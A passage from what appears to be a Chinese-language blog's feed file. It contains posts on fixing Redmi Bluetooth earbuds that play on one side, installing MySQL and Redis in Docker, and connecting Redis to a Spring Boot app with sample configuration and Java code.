"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNVZ0cHkyUkRrSlNUWmRoLnBuZw.png" alt="image-20200608004409477"></p></li></ol>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 操作系统 </tag>
        
            
            
        <tag> cpp </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>亲测：解决红米蓝牙耳机只有一边有声音的问题</title>
      
      
      <link href="/cn/posts/56389/"/>
      
      
      <url>/cn/posts/56389/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：之前耳机出问题一直在网上找答案，网上的答案有漏的地方，所以一直失败，所以把我的方案写下来记录一下。</p></blockquote><p>1.手机上取消和耳机的配对</p><p>2.在开机状态将两只耳机长按5秒关机，关机后松开（关机的时候两只耳机灯都不亮，如果本身就是关机状态就不用）</p><p>3.长按两只耳机，闪白灯，继续按，然后出现一次红白灯闪，不要放手继续按住，直到再出现一次红白灯闪（这很重要）。这是清除配置信息、 手机上记得选择取消配对并关闭蓝牙。</p><p>4.先将右耳机开机再将左耳机开机。（一定要放到盒子里，在盒子里拿出来会自动开机，所以只用先把右耳机拿出来）</p><p>5.这时候右耳机快闪，当左耳机不闪的时候左右耳机就配对成功了。</p><p>6.进入手机蓝牙设置，这时候应该可以连接了</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 生活 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>docker中安装mysql</title>
      
      
      <link href="/cn/posts/15098/"/>
      
      
      <url>/cn/posts/15098/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="Docker-安装-MySQL"><a href="#Docker-安装-MySQL" class="headerlink" title="Docker 安装 MySQL"></a>Docker 安装 MySQL</h1><p>MySQL 是世界上最受欢迎的开源数据库。凭借其可靠性、易用性和性能，MySQL 已成为 Web 应用程序的数据库优先选择。</p><h3 id="1、查看可用的-MySQL-版本"><a href="#1、查看可用的-MySQL-版本" class="headerlink" title="1、查看可用的 MySQL 版本"></a>1、查看可用的 MySQL 版本</h3><p>访问 MySQL 镜像库地址：<a href="https://hub.docker.com/_/mysql?tab=tags">https://hub.docker.com/_/mysql?tab=tags</a> 。</p><p>可以通过 Sort by 查看其他版本的 MySQL，默认是最新版本 <strong>mysql:latest</strong> 。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql1.png" alt="img"></a></p><p>你也可以在下拉列表中找到其他你想要的版本：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql2.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql2.png" alt="img"></a></p><p>此外，我们还可以用  docker search mysql 命令来查看可用版本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ docker search mysql</span><br><span class="line">NAME                     DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                    MySQL is a widely used, open-source relati...   2529      [OK]       </span><br><span class="line">mysql/mysql-server       Optimized MySQL Server Docker images. Crea...   161                  [OK]</span><br><span class="line">centurylink/mysql        Image containing mysql. Optimized to be li...   45                   [OK]</span><br><span class="line">sameersbn/mysql                                                          36                   [OK]</span><br><span class="line">google/mysql             MySQL server for Google Compute Engine          16                   [OK]</span><br><span class="line">appcontainers/mysql      Centos/Debian Based Customizable MySQL Con...   8                    [OK]</span><br><span class="line">marvambass/mysql         MySQL Server based on Ubuntu 14.04              6                    [OK]</span><br><span class="line">drupaldocker/mysql       MySQL for Drupal                                2                    [OK]</span><br><span class="line">azukiapp/mysql           Docker image to run MySQL by Azuki - http:...   2                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h3 id="2、拉取-MySQL-镜像"><a href="#2、拉取-MySQL-镜像" class="headerlink" title="2、拉取 MySQL 镜像"></a>2、拉取 MySQL 镜像</h3><p>这里我们拉取官方的最新版本的镜像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull mysql:latest</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql3.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql3.png" alt="img"></a></p><h3 id="3、查看本地镜像"><a href="#3、查看本地镜像" class="headerlink" title="3、查看本地镜像"></a>3、查看本地镜像</h3><p>使用以下命令来查看是否已安装了 mysql：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql6.png" alt="img"></a></p><p>在上图中可以看到我们已经安装了最新版本（latest）的 mysql 镜像。</p><h3 id="4、运行容器"><a href="#4、运行容器" class="headerlink" title="4、运行容器"></a>4、运行容器</h3><p>安装完成后，我们可以使用以下命令来运行 mysql 容器：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -itd --name mysql-latest-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=czqu123456 mysql</span><br></pre></td></tr></tbody></table></figure><p>参数说明：</p><ul><li><strong>-p 3306:3306</strong> ：映射容器服务的 3306 端口到宿主机的 3306 端口，外部主机可以直接通过 宿主机ip:3306 访问到 MySQL 的服务。</li><li><strong>MYSQL_ROOT_PASSWORD=123456</strong>：设置 MySQL 服务 root 用户的密码。</li></ul><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql4.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql4.png" alt="img"></a></p><h3 id="5、安装成功"><a href="#5、安装成功" class="headerlink" title="5、安装成功"></a>5、安装成功</h3><p>通过 docker ps 命令查看是否安装成功：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql5.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql5.png" alt="img"></a></p><p>本机可以通过 root 和密码 123456 访问 MySQL 服务。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/15098/docker-mysql7.png" alt="img"></a></p><p>​            </p>]]></content>
      
      
      
      
    
    </entry>
    <entry>
      
      
      <title>redis整合springboot</title>
      
      
      <link href="/cn/posts/9380/"/>
      
      
      <url>/cn/posts/9380/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="Docker-安装-Redis"><a href="#Docker-安装-Redis" class="headerlink" title="Docker 安装 Redis"></a>Docker 安装 Redis</h2><p>Redis 是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 的 NoSQL 数据库，并提供多种语言的 API。</p><h3 id="1、查看可用的-Redis-版本"><a href="#1、查看可用的-Redis-版本" class="headerlink" title="1、查看可用的 Redis 版本"></a>1、查看可用的 Redis 版本</h3><p>访问 Redis 镜像库地址： <a href="https://hub.docker.com/_/redis?tab=tags%E3%80%82">https://hub.docker.com/_/redis?tab=tags。</a></p><p>可以通过 Sort by 查看其他版本的 Redis，默认是最新版本 <strong>redis:latest</strong>。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis1.png" alt="img"></a></p><p>你也可以在下拉列表中找到其他你想要的版本：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis2.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis2.png" alt="img"></a></p><p>此外，我们还可以用  docker search redis 命令来查看可用版本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ docker search  redis</span><br><span class="line">NAME                      DESCRIPTION                   STARS  OFFICIAL  AUTOMATED</span><br><span class="line">redis                     Redis is an open source ...   2321   [OK]       </span><br><span class="line">sameersbn/redis                                         32                   [OK]</span><br><span class="line">torusware/speedus-redis   Always updated official ...   29             [OK]</span><br><span class="line">bitnami/redis             Bitnami Redis Docker Image    22                   [OK]</span><br><span class="line">anapsix/redis             11MB Redis server image ...   6                    [OK]</span><br><span class="line">webhippie/redis           Docker images for redis       4                    [OK]</span><br><span class="line">clue/redis-benchmark      A minimal docker image t...   3                    [OK]</span><br><span class="line">williamyeh/redis          Redis image for Docker        3                    [OK]</span><br><span class="line">unblibraries/redis        Leverages phusion/baseim...   2                    [OK]</span><br><span class="line">greytip/redis             redis 3.0.3                   1                    [OK]</span><br><span class="line">servivum/redis            Redis Docker Image            1                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h3 id="2、取最新版的-Redis-镜像"><a href="#2、取最新版的-Redis-镜像" class="headerlink" title="2、取最新版的 Redis 镜像"></a>2、取最新版的 Redis 镜像</h3><p>这里我们拉取官方的最新版本的镜像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull redis:latest</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis3.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis3.png" alt="img"></a></p><blockquote><p>针对Docker客户端版本大于 1.10.0 的用户</p><p>你可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">{</span><br><span class="line">  "registry-mirrors": ["https://r46f0phk.mirror.aliyuncs.com"]</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="3、查看本地镜像"><a href="#3、查看本地镜像" class="headerlink" title="3、查看本地镜像"></a>3、查看本地镜像</h3><p>使用以下命令来查看是否已安装了 redis：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis4.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis4.png" alt="img"></a></p><p>在上图中可以看到我们已经安装了最新版本（latest）的 redis 镜像。</p><h3 id="4、运行容器"><a href="#4、运行容器" class="headerlink" title="4、运行容器"></a>4、运行容器</h3><p>安装完成后，我们可以使用以下命令来运行 redis 容器：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -itd --name redis-test -p 6379:6379 redis --requirepass "czqu@123"</span><br></pre></td></tr></tbody></table></figure><p>参数说明：</p><ul><li><strong>-p 6379:6379</strong>：映射容器服务的 6379 端口到宿主机的 6379 端口。外部可以直接通过宿主机ip:6379 访问到 Redis 的服务。</li><li>–requirepasss 设置密码</li></ul><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis5.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis5.png" alt="img"></a></p><blockquote><p>docker容器设置开机自启动：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--restart具体参数值详细信息``no - 容器退出时，不重启容器``on-failure - 只有在非0状态退出时才从新启动容器``always - 无论退出状态是如何，都重启容器</span><br></pre></td></tr></tbody></table></figure><p>　　还可以在使用 on-failure 策略时，指定 Docker 将尝试重新启动容器的最大次数；默认情况下，Docker 将尝试永远重新启动容器；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart=on-failure:10 redis</span><br></pre></td></tr></tbody></table></figure><p>　　</p><p>　　如果创建时未指定 –restart=always ,可通过 update 命令更改；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart=always 容器ID</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="5、安装成功"><a href="#5、安装成功" class="headerlink" title="5、安装成功"></a>5、安装成功</h3><p>最后我们可以通过 <strong>docker ps</strong> 命令查看容器的运行信息：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis6.png" alt="img"></a></p><p>接着我们通过 redis-cli 连接测试使用 redis 服务。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker exec -it redis-test /bin/bash</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/9380/docker-redis7.png" alt="img"></a></p><p>​            </p><h2 id="整合springboot"><a href="#整合springboot" class="headerlink" title="整合springboot"></a>整合springboot</h2><h3 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1.引入依赖"></a>1.引入依赖</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cc.czqu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redis-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>redis-test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.lettuce<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lettuce-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="2-创建实体类"><a href="#2-创建实体类" class="headerlink" title="2.创建实体类"></a>2.创建实体类</h3><p>随便创建一个实现序列化接口的实体类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc.czqu.redistest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="3-配置application-properties"><a href="#3-配置application-properties" class="headerlink" title="3.配置application.properties"></a>3.配置application.properties</h3><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.redis.database</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string">czqu@123</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">192.168.63.129</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.max-active</span>=<span class="string">8 #最大连接数</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.max-wait</span>=<span class="string">-1ms #最大阻塞时间 -1表示无限制</span></span><br><span class="line"><span class="attr">spring.redis.jedis.pool.min-idle</span>=<span class="string">0 #连接池中最小空闲连接数</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>4.创建测试类</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc.czqu.redistest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.ValueOperations;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> {</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    RedisTemplate redisTemplate;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    StringRedisTemplate stringRedisTemplate;</span><br><span class="line">    <span class="meta">@GetMapping("/test1")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"hello"</span>);</span><br><span class="line">        ValueOperations&lt;String,String&gt; ops1=stringRedisTemplate.opsForValue();</span><br><span class="line">        ops1.set(<span class="string">"name"</span>,<span class="string">"三国演义"</span>);</span><br><span class="line">        String name=ops1.get(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="comment">//实体类的读写</span></span><br><span class="line">        Book book1=<span class="keyword">new</span> <span class="title class_">Book</span>();</span><br><span class="line">        book1.setId(<span class="number">666</span>);</span><br><span class="line">        book1.setAuthor(<span class="string">"陈子琦"</span>);</span><br><span class="line">        book1.setName(<span class="string">"快乐学习"</span>);</span><br><span class="line">        ValueOperations&lt;String,Book&gt; ops2= redisTemplate.opsForValue();</span><br><span class="line">        ops2.set(<span class="string">"b1"</span>,book1);</span><br><span 